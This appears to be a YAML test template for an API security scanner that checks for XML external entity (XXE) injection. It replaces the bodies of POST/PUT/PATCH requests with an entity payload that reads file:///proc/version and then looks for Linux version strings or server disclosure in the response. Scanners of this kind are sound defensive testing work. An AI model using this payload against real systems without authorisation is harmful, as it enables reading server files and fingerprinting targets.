api_selection_filters:
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
  request_headers:
    for_one:
      key:
        contains_either:
          - content-type
          - Content-Type
        extract: headerKey
  method:
    contains_either:
      - POST
      - PUT
      - PATCH

wordLists:
  payloads:
    - "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///proc/version\">]>"
execute:
  type: single
  requests:
    - req:
        - replace_body: ${payloads}
        - modify_header:
            ${headerKey}: "application/xml"
validate:
  and:
    - response_payload:
        length:
          gt: 0
        not_contains:
          - Error
          - Internal Server
          - Failed
          - Unauthorized
          - access denied
          - Forbidden
          - Method Not allowed
          - Gateway timeout
          - request timeout
          - server error
          - server busy
          - authentication error
          - authorization error
          - validation error
          - Permission Denied
          - invalid token
          - token expired
          - session expired
          - session timeout
          - unexpected error
          - unable to process request
          - bad request
          - service unavailable
          - account is locked
          - account is blocked
          - multiple failed attempts
          - Attention Required!
          - CloudFlare
          - Sorry, you have been blocked
          - <html>
          - </html>
    - or:
        - response_payload:
            regex: "(?:Server|Host|Database|Connection)\\s*:\\s*([^\\n\\r]+)"
        - response_headers:
            regex: "(?:Server|Host|Database|Connection)\\s*:\\s*([^\\n\\r]+)"
        - response_payload:
            regex: "(Server:|X-Powered-By:|Environment:|Runtime:|Stack Trace:|Exception:|Location:|Path:)\\s.*\\n"
        - response_headers:
            regex: "(Server:|X-Powered-By:|Environment:|Runtime:|Stack Trace:|Exception:|Location:|Path:)\\s.*\\n"
        - response_headers:
            regex: "Linux version [\\d.]+(?:-[\\w\\d.+-]+)?"
        - response_payload:
            regex: "Linux version [\\d.]+(?:-[\\w\\d.+-]+)?"
